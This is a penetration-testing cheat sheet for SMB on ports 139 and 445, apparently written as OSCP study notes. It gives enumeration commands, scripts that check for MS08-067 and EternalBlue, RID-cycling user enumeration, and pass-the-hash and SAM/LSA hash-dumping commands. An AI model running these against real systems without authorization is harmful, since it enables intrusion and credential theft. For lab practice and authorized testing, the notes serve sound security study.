# Notes — SMB (139 / 445)

> Authorized lab/OSCP use only.

## What it is
Windows file/printer sharing (and Samba on Linux). NetBIOS session on 139, direct SMB on 445. A top-priority enumeration target on both Windows and Linux boxes.

## Enumeration

```bash
# OS / signing / domain
crackmapexec smb $IP
nmap --script smb-os-discovery -p445 $IP

# Full sweep
enum4linux -a $IP
enum4linux-ng -A $IP          # modern rewrite

# Shares
smbclient -L //$IP/ -N        # null session list
smbmap -H $IP                 # permissions at a glance
smbmap -H $IP -u guest -p ''  # guest

# Connect to a share
smbclient //$IP/<share> -N
#   > ls, get <file>, put <file>, recurse ON, prompt OFF, mget *

# Authenticated
smbmap -H $IP -u user -p pass
crackmapexec smb $IP -u user -p pass --shares
```

## Vulnerability Checks

```bash
nmap --script "smb-vuln*" -p139,445 $IP
# notable: smb-vuln-ms08-067, smb-vuln-ms17-010
```

| Version clue | Likely issue |
|--------------|--------------|
| Samba 3.0.x | CVE-2007-2447 username map script (see HTB Lame) |
| Windows XP/2003 SMB | MS08-067 |
| Unpatched SMBv1 | MS17-010 EternalBlue (see HTB Legacy) |

## RID Cycling / Users
```bash
crackmapexec smb $IP -u '' -p '' --rid-brute
rpcclient -U "" -N $IP        # then: enumdomusers, querydominfo
lookupsid.py anonymous@$IP
```

## Pass-the-Hash
```bash
crackmapexec smb $IP -u user -H <NTLM-hash>
psexec.py user@$IP -hashes :<NTLM-hash>
```

## Common Mistakes
- Testing only 445 and ignoring 139 (or vice-versa).
- Not trying null/guest sessions.
- Forgetting `recurse ON; prompt OFF` before `mget *`.

## OSCP Tips
- `(Pwn3d!)` in CME = admin → try `--sam`/`--lsa` to dump hashes.
- Note the exact Samba/Windows version for CVE lookup.
- SMB is often the whole box on easy machines — enumerate thoroughly.
